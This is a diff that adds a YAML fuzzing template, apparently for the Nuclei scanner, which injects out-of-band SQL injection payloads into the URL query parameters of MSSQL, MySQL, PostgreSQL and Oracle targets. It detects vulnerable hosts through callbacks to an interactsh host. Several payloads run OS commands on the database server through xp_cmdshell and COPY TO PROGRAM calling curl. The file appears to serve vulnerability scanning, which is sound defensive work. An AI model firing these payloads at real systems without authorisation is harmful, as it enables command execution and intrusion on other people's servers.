@@ -1,0 +1,54 @@
+id: fuzz-oob-all
+info:
+  name: Universal OOB Fuzzing (MSSQL, MySQL, PostgreSQL, Oracle)
+  author: openai
+  severity: critical
+  tags: dast,oob,sqli,mssql,mysql,postgresql,oracle
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      oob_payloads:
+        - "1; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1; exec master..xp_subdirs '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1; exec xp_cmdshell 'curl http://{{interactsh-url}}/cmd'--"
+        - "1'; exec master..xp_dirtree '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1'; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1'; exec master..xp_subdirs '\\\\{{interactsh-url}}\\\\abc'--"
+        - "1'; exec xp_cmdshell 'curl http://{{interactsh-url}}/cmd'--"
+        - '1"; exec master..xp_dirtree ''\\\\{{interactsh-url}}\\\\abc''--'
+        - '1"; exec master..xp_fileexist ''\\\\{{interactsh-url}}\\\\abc''--'
+        - '1"; exec master..xp_subdirs ''\\\\{{interactsh-url}}\\\\abc''--'
+        - '1"; exec xp_cmdshell ''curl http://{{interactsh-url}}/cmd''--'
+        - "1' UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
+        - '1" UNION SELECT LOAD_FILE(''\\\\{{interactsh-url}}\\\\abc'')-- -'
+        - "1 UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')-- -"
+        - "1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--"
+        - "1'; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--"
+        - '1"; COPY (SELECT ''test'') TO PROGRAM ''curl http://{{interactsh-url}}/abc''--'
+        - "1 COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--"
+        - "1; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--"
+        - "1; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--"
+        - "1'; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--"
+        - "1'; BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--"
+        - '1"; SELECT UTL_HTTP.REQUEST(''http://{{interactsh-url}}/oracle'') FROM DUAL--'
+        - '1"; BEGIN DBMS_LDAP.INIT(''ldap.{{interactsh-url}}'', 80); END;--'
+        - "1 SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}/oracle') FROM DUAL--"
+        - "1 BEGIN DBMS_LDAP.INIT('ldap.{{interactsh-url}}', 80); END;--"
+        
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "{{oob_payloads}}"
+          
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
